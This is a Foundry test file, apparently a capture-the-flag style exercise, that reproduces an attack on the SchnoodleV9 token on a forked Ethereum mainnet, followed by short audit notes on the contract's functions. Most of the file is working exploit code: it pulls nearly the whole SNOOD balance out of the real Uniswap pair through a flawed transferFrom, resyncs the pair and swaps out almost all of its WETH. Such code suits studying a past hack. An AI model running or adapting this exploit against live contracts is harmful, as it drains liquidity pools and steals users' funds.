// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/SchnoodleV9.sol";
import "../src/interfaces/IUniswapV2Pair.sol";
import "../src/interfaces/IWETH9.sol";

contract SchnoodleHack is Test {
    SchnoodleV9 snood = SchnoodleV9(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IUniswapV2Pair uniswap = IUniswapV2Pair(0x0F6b0960d2569f505126341085ED7f0342b67DAe);
    IWETH9 weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testSchnoodleHack() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 14983600);
        console.log("Your Starting WETH Balance:", weth.balanceOf(address(this)));

        // INSERT EXPLOIT HERE

        vm.label(address(uniswap), "UniswapV2");
        vm.label(address(snood), "SNOOD");
        vm.label(address(weth), "WETH");

        uint256 amountSNOOD = snood.balanceOf(address(uniswap));
        snood.transferFrom(address(uniswap), address(this), amountSNOOD - 1);
        console.log("Got %d SNOOD", amountSNOOD / 1 ether);

        // kick the pair
        uniswap.sync();
 
        (uint112 uniWETH, uint112 uniSNOOD,) = uniswap.getReserves();
        console.log("UniswapV2 Pair: %d WETH, %d SNOOD", uniWETH / 1 ether, uniSNOOD / 1 ether);

        snood.transfer(address(uniswap), amountSNOOD - 1);
        uniswap.swap(uniWETH - 1, 0, address(this), "");

        console.log("Your Final WETH Balance:", weth.balanceOf(address(this)));
        assert(weth.balanceOf(address(this)) > 100 ether);
    }
}

// SchnoodleV9Base
// External functions that change state: NO

// SchnoodleV9
// External functions that change state:
//
// - setTokens
//   * calls burn(amount, "")
//   * modifies _tokensSent
// - payFee
//   * modifies _feesPaid
//   * transfers msg.value to _bridgeOwner 

// ERC777?
// transferFrom